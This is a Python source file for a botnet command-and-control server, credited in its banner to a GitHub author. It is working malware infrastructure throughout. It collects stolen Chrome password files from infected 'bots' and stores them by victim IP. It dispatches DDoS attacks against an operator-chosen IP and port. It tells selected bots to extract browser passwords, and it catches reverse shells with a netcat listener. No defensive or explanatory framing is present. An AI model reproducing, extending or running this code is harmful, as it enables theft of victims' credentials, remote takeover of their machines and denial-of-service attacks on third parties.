import socket
import threading
import os
import sys


# List to keep track of connected clients
connected_clients = []
clients_lock = threading.Lock()

host = '0.0.0.0'
port = 443

def handle_client(client_socket, address):
    global connected_clients

    print(f"[+] Connection from {address}")
    with clients_lock:
        connected_clients.append((client_socket, address))

    while True:
        try:
            message = client_socket.recv(1024).decode('utf-8')
            if not message:
                print(f"[-] Connection with {address} closed.")
                break
            print(f"[+] Received from {address}: {message}")

            if message == "chrome_passwords.txt":
                save_passwords_file(client_socket, address)

        except ConnectionResetError:
            print(f"[-] Connection with {address} closed.")
            break
        except Exception as e:
            print(f"[!] Error handling client {address}: {e}")
            break

    with clients_lock:
        connected_clients = [(sock, addr) for sock, addr in connected_clients if sock != client_socket]
    client_socket.close()
    print(f"[-] Connection with {address} closed.")

def save_passwords_file(client_socket, address):
    try:
        # Create 'bots' directory if it doesn't exist
        if not os.path.exists('bots'):
            os.makedirs('bots')

        # Determine client IP
        client_ip = address[0]

        # Save the file with client IP as part of the filename
        filename = f"bots/{client_ip}_passwords.txt"
        with open(filename, 'wb') as file:
            while True:
                chunk = client_socket.recv(1024)
                if not chunk:
                    break
                file.write(chunk)

        print(f"[*] Saved {filename} successfully.")

    except Exception as e:
        print(f"[!] Error saving passwords file from {address}: {e}")

def send_message_to_clients(message):
    global connected_clients

    with clients_lock:
        clients_to_remove = []
        for client_socket, _ in connected_clients:
            try:
                client_socket.send(message.encode('utf-8'))
                if message == "disconnect_all":
                    client_socket.shutdown(socket.SHUT_RDWR)
                    client_socket.close()
                    clients_to_remove.append(client_socket)
            except Exception as e:
                print(f"Error sending '{message}' to client: {e}")

        # Remove clients that were closed from the connected_clients list
        connected_clients = [(client_socket, addr) for client_socket, addr in connected_clients
                             if client_socket not in clients_to_remove]

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)

    print(f"[*] Server listening on {host}:{port}\n")

    # Start a new thread to handle each client
    client_acceptor = threading.Thread(target=accept_clients, args=(server_socket,))
    client_acceptor.start()

    # Start a new thread for sending messages to clients
    message_sender = threading.Thread(target=send_messages)
    message_sender.start()

def accept_clients(server_socket):
    while True:
        client_socket, address = server_socket.accept()
        client_handler = threading.Thread(target=handle_client, args=(client_socket, address))
        client_handler.start()

def send_messages():
    while True:
        print(f"""
  ____  _              _____ _     _             
 |  _ \| |            |  __ (_)   | |            
 | |_) | |_   _  ___  | |__) |  __| | __ _ _ __  
 |  _ <| | | | |/ _ \ |  ___/ |/ _` |/ _` | '_ \ 
 | |_) | | |_| |  __/ | |   | | (_| | (_| | | | |
 |____/|_|\__,_|\___| |_|   |_|\__,_|\__, |_| |_|
                                      __/ |      
                                     |___/       
              
              Made by: https://github.com/LTWeaver
              Use 'help' to get started
              Use 'quit' to quit (will have to reboot server if you dont use this)
\n\nBots Connected: {len(connected_clients)}""")
        message_to_send = input("\n\n\n>>>: ")
        os.system('clear')

        if message_to_send.lower() == 'quit':
            # Send a message to all clients to disconnect
            send_message_to_clients("disconnect_all")

            # Close all client connections
            for client_socket, _ in connected_clients:
                client_socket.close()
            connected_clients.clear()  # Clear the list of connected clients
            print("[*] All clients removed. Quitting... (Press Ctrl+C to exit)")
            sys.exit()  # Terminate the script using sys.exit()

        # Check if the input is "shell"
        if message_to_send.lower() == 'shell':
            # Display a list of connected clients
            print("Connected Clients:")
            for idx, (client_socket, client_address) in enumerate(connected_clients, 1):
                client_ip = client_address[0]
                print(f"{idx}. {client_ip}")

            # Prompt the user to select a client for a shell
            selected_client = input("\nSelect a client for a shell (enter the number): \n")
            print("[*] Ctr-c to stop listening / exit shell\n")
            try:
                selected_index = int(selected_client) - 1
                if 0 <= selected_index < len(connected_clients):
                    target_ip = connected_clients[selected_index][1][0]  # Get client IP
                    send_message_to_client(target_ip, "shell")
                    os.system("sudo nc -nvlp 4444")
                else:
                    print("[!] Invalid client selection.")
            except ValueError:
                print("[!] Invalid input. Please enter a number.")

        elif message_to_send == "remove":
            print("Connected Clients:")
            for idx, (client_socket, client_address) in enumerate(connected_clients, 1):
                client_ip = client_address[0]
                print(f"{idx}. {client_ip}")

            selected_client = input("\nSelect a client to remove (enter the number, 'all' to remove all): ")
            remove_client(selected_client)

        elif message_to_send == "help":
            print("""Commands:\n\n1) shell  - Spawn a shell on a selected bot\n2) attack - Starts DDoS attack\n3) extract - Extracts browser passwords\n4) list   - Shows the list of bots connected\n5) remove - Remove client/s\n6) quit   - Quit DDoS attack\n""")

        elif message_to_send == "list":
            print("Connected Bots:\n")
            for idx, (client_socket, client_address) in enumerate(connected_clients, 1):
                client_ip = client_address[0]
                print(f"{idx}. {client_ip}")

        elif message_to_send == "attack":
            ip = input("Enter target IP address: ")
            threads = input("Thread ammount (max=70): ")
            if int(threads) > 70:
                threads = "70"
                print("[!] Too many threads, setting to max")
            timer = input("Attack length (s): ")
            port = input("Port: ")

            # Send the "attack" command along with IP, threads, and timer to all clients
            send_message_to_clients(f"attack {ip} {threads} {timer} {port}")
            print(f"[*] Attack on {ip}:{port} with {threads} threads for {timer} seconds started...")

        elif message_to_send.lower() == "extract":
            # Display a list of connected clients
            print("Connected Clients:")
            for idx, (client_socket, client_address) in enumerate(connected_clients, 1):
                client_ip = client_address[0]
                print(f"{idx}. {client_ip}")

            # Prompt the user to select a client for a shell
            selected_client = input("\nSelect a client to extract passwords from (enter the number): \n")
            try:
                selected_index = int(selected_client) - 1
                if 0 <= selected_index < len(connected_clients):
                    target_ip = connected_clients[selected_index][1][0]  # Get client IP
                    send_message_to_client(target_ip, "extract")

                else:
                    print("[!] Invalid client selection.")
            except ValueError:
                print("[!] Invalid input. Please enter a number.")

        else:
            # Send the message to all clients
            send_message_to_clients(message_to_send)

def send_message_to_client(target_ip, message):
    global connected_clients

    with clients_lock:
        for client_socket, client_address in connected_clients:
            if client_address[0] == target_ip:
                try:
                    client_socket.send(message.encode('utf-8'))
                    print(f"[*] Sent '{message}' to client {target_ip}.")
                except Exception as e:
                    print(f"[!] Error sending '{message}' to client {target_ip}: {e}")
                return

        print(f"[!] Client with IP {target_ip} not found.")

def remove_client(selected_client):
    global connected_clients

    if selected_client.lower() == 'all':
        # Send a message to all clients to disconnect
        send_message_to_clients("disconnect_all")

        # Close all client connections
        with clients_lock:
            for client_socket, _ in connected_clients:
                try:
                    client_socket.send("disconnect".encode('utf-8'))  # Send disconnect message
                    client_socket.shutdown(socket.SHUT_RDWR)  # Shutdown the socket
                    client_socket.close()  # Close the client socket
                except Exception as e:
                    print(f"Error closing client socket: {e}")
            connected_clients.clear()  # Clear the list of connected clients
        print("[*] All clients removed and connections closed.")
    else:
        try:
            selected_index = int(selected_client) - 1
            if 0 <= selected_index < len(connected_clients):
                client_socket, client_address = connected_clients[selected_index]

                # Send a message to the specific client to disconnect
                client_socket.send("disconnect".encode('utf-8'))

                # Close the client socket and remove from the list
                with clients_lock:
                    client_socket.shutdown(socket.SHUT_RDWR)  # Shutdown the socket
                    client_socket.close()  # Close the client socket
                    connected_clients.remove((client_socket, client_address))
                print(f"[*] Client {selected_client} removed and connection closed.")

            else:
                print("[!] Invalid client selection.")
        except ValueError:
            print("[!] Invalid input. Please enter a number.")
        except Exception as e:
            print(f"[!] Error removing client: {e}")

if __name__ == "__main__":
    start_server()
